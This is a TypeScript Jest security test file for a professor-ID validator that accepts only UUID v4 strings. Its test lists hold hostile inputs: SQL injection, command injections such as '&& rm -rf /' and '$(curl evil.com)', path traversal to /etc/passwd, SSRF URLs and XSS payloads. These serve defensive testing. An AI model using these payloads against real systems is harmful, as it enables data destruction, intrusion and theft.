/**
 * Security Tests for Professor ID Validation
 * Tests the isValidProfessorId function to ensure it properly blocks malicious inputs
 */

import { describe, it, expect } from '@jest/globals';

/**
 * Copy of the validation function from [id].tsx for testing
 * In production, this should be extracted to a shared utility file
 */
function isValidProfessorId(id: string | string[] | undefined): id is string {
  if (!id || typeof id !== 'string') {
    return false;
  }
  
  // UUID v4 format: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx
  const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  
  return uuidV4Regex.test(id);
}

describe('Professor ID Validation - Security Tests', () => {
  describe('Valid UUIDs', () => {
    it('should accept valid UUID v4', () => {
      const validUUIDs = [
        '550e8400-e29b-41d4-a716-446655440000',
        '6ba7b810-9dad-41d1-80b4-00c04fd430c8',
        'f47ac10b-58cc-4372-a567-0e02b2c3d479',
        '123e4567-e89b-42d3-a456-426614174000',
      ];

      validUUIDs.forEach(uuid => {
        expect(isValidProfessorId(uuid)).toBe(true);
      });
    });

    it('should accept UUID with uppercase letters', () => {
      expect(isValidProfessorId('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
    });

    it('should accept UUID with mixed case', () => {
      expect(isValidProfessorId('550e8400-E29B-41d4-A716-446655440000')).toBe(true);
    });
  });

  describe('SSRF Attack Prevention', () => {
    it('should reject path traversal attempts', () => {
      const pathTraversalAttempts = [
        '../admin',
        '../../etc/passwd',
        '../../../config',
        './../../secrets',
        '..\\..\\admin',
      ];

      pathTraversalAttempts.forEach(attempt => {
        expect(isValidProfessorId(attempt)).toBe(false);
      });
    });

    it('should reject URL-based SSRF attempts', () => {
      const urlAttempts = [
        'http://localhost:3000/admin',
        'https://evil.com/steal-data',
        'file:///etc/passwd',
        'ftp://internal-server/data',
      ];

      urlAttempts.forEach(attempt => {
        expect(isValidProfessorId(attempt)).toBe(false);
      });
    });

    it('should reject internal network addresses', () => {
      const internalAddresses = [
        '127.0.0.1',
        '192.168.1.1',
        'localhost',
        '10.0.0.1',
      ];

      internalAddresses.forEach(address => {
        expect(isValidProfessorId(address)).toBe(false);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should reject SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE professors--",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1; DELETE FROM reviews WHERE '1'='1",
      ];

      sqlInjections.forEach(injection => {
        expect(isValidProfessorId(injection)).toBe(false);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should reject command injection attempts', () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(curl evil.com)',
      ];

      commandInjections.forEach(injection => {
        expect(isValidProfessorId(injection)).toBe(false);
      });
    });
  });

  describe('Invalid UUID Formats', () => {
    it('should reject UUIDs with wrong version', () => {
      // UUID v1, v3, v5 (not v4)
      const wrongVersions = [
        '550e8400-e29b-11d4-a716-446655440000', // v1
        '550e8400-e29b-31d4-a716-446655440000', // v3
        '550e8400-e29b-51d4-a716-446655440000', // v5
      ];

      wrongVersions.forEach(uuid => {
        expect(isValidProfessorId(uuid)).toBe(false);
      });
    });

    it('should reject malformed UUIDs', () => {
      const malformedUUIDs = [
        '550e8400-e29b-41d4-a716',              // too short
        '550e8400-e29b-41d4-a716-446655440000-extra', // too long
        '550e8400e29b41d4a716446655440000',     // no dashes
        '550e8400-e29b-41d4-g716-446655440000', // invalid character (g)
        'not-a-uuid-at-all',
        '12345',
        '',
      ];

      malformedUUIDs.forEach(uuid => {
        expect(isValidProfessorId(uuid)).toBe(false);
      });
    });
  });

  describe('Edge Cases', () => {
    it('should reject null and undefined', () => {
      expect(isValidProfessorId(null as any)).toBe(false);
      expect(isValidProfessorId(undefined)).toBe(false);
    });

    it('should reject array inputs', () => {
      expect(isValidProfessorId(['550e8400-e29b-41d4-a716-446655440000'])).toBe(false);
      expect(isValidProfessorId(['id1', 'id2'] as any)).toBe(false);
    });

    it('should reject numeric inputs', () => {
      expect(isValidProfessorId(12345 as any)).toBe(false);
      expect(isValidProfessorId(0 as any)).toBe(false);
    });

    it('should reject object inputs', () => {
      expect(isValidProfessorId({} as any)).toBe(false);
      expect(isValidProfessorId({ id: '550e8400-e29b-41d4-a716-446655440000' } as any)).toBe(false);
    });

    it('should reject boolean inputs', () => {
      expect(isValidProfessorId(true as any)).toBe(false);
      expect(isValidProfessorId(false as any)).toBe(false);
    });

    it('should reject empty string', () => {
      expect(isValidProfessorId('')).toBe(false);
    });

    it('should reject whitespace', () => {
      expect(isValidProfessorId('   ')).toBe(false);
      expect(isValidProfessorId('\n')).toBe(false);
      expect(isValidProfessorId('\t')).toBe(false);
    });
  });

  describe('XSS Prevention', () => {
    it('should reject XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
      ];

      xssAttempts.forEach(attempt => {
        expect(isValidProfessorId(attempt)).toBe(false);
      });
    });
  });

  describe('Special Characters', () => {
    it('should reject special characters and symbols', () => {
      const specialChars = [
        '@#$%^&*()',
        '!@#$%^&',
        '{}[]<>',
        '~`',
        '+=',
        '|\\',
      ];

      specialChars.forEach(chars => {
        expect(isValidProfessorId(chars)).toBe(false);
      });
    });
  });
});

// Run the tests and log results
console.log('🧪 Running Professor ID Validation Security Tests...\n');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

const runTest = (description: string, testFn: () => void) => {
  totalTests++;
  try {
    testFn();
    passedTests++;
    console.log(`✅ ${description}`);
  } catch (error) {
    failedTests++;
    console.log(`❌ ${description}`);
    console.log(`   Error: ${error}`);
  }
};

// Valid UUIDs
console.log('\n📋 Valid UUID Tests:');
runTest('Valid UUID v4', () => {
  const valid = isValidProfessorId('550e8400-e29b-41d4-a716-446655440000');
  if (!valid) throw new Error('Should accept valid UUID v4');
});

runTest('Valid UUID uppercase', () => {
  const valid = isValidProfessorId('550E8400-E29B-41D4-A716-446655440000');
  if (!valid) throw new Error('Should accept uppercase UUID');
});

// SSRF Prevention
console.log('\n🛡️  SSRF Attack Prevention Tests:');
runTest('Block path traversal (../admin)', () => {
  const blocked = !isValidProfessorId('../admin');
  if (!blocked) throw new Error('Should block path traversal');
});

runTest('Block URL (http://evil.com)', () => {
  const blocked = !isValidProfessorId('http://evil.com/data');
  if (!blocked) throw new Error('Should block URL attempts');
});

runTest('Block internal IP (127.0.0.1)', () => {
  const blocked = !isValidProfessorId('127.0.0.1');
  if (!blocked) throw new Error('Should block internal IPs');
});

// SQL Injection Prevention
console.log('\n💉 SQL Injection Prevention Tests:');
runTest("Block SQL injection ('; DROP TABLE--)", () => {
  const blocked = !isValidProfessorId("'; DROP TABLE professors--");
  if (!blocked) throw new Error('Should block SQL injection');
});

runTest("Block SQL injection (1' OR '1'='1)", () => {
  const blocked = !isValidProfessorId("1' OR '1'='1");
  if (!blocked) throw new Error('Should block SQL injection');
});

// Command Injection
console.log('\n⚡ Command Injection Prevention Tests:');
runTest('Block command injection (; ls -la)', () => {
  const blocked = !isValidProfessorId('; ls -la');
  if (!blocked) throw new Error('Should block command injection');
});

runTest('Block command injection (| cat /etc/passwd)', () => {
  const blocked = !isValidProfessorId('| cat /etc/passwd');
  if (!blocked) throw new Error('Should block command injection');
});

// XSS Prevention
console.log('\n🔒 XSS Prevention Tests:');
runTest('Block XSS (<script>alert(1)</script>)', () => {
  const blocked = !isValidProfessorId('<script>alert(1)</script>');
  if (!blocked) throw new Error('Should block XSS');
});

runTest('Block XSS (javascript:alert(1))', () => {
  const blocked = !isValidProfessorId('javascript:alert(1)');
  if (!blocked) throw new Error('Should block XSS');
});

// Invalid Formats
console.log('\n❌ Invalid Format Tests:');
runTest('Reject malformed UUID (too short)', () => {
  const blocked = !isValidProfessorId('550e8400-e29b-41d4-a716');
  if (!blocked) throw new Error('Should reject short UUID');
});

runTest('Reject empty string', () => {
  const blocked = !isValidProfessorId('');
  if (!blocked) throw new Error('Should reject empty string');
});

runTest('Reject null/undefined', () => {
  const blocked = !isValidProfessorId(undefined);
  if (!blocked) throw new Error('Should reject undefined');
});

// Summary
console.log('\n' + '='.repeat(50));
console.log('📊 Test Summary:');
console.log('='.repeat(50));
console.log(`Total Tests: ${totalTests}`);
console.log(`✅ Passed: ${passedTests}`);
console.log(`❌ Failed: ${failedTests}`);
console.log(`Success Rate: ${((passedTests / totalTests) * 100).toFixed(1)}%`);
console.log('='.repeat(50));

if (failedTests === 0) {
  console.log('\n🎉 All security tests passed! The validation is working correctly.');
} else {
  console.log('\n⚠️  Some tests failed. Please review the validation logic.');
  process.exit(1);
}
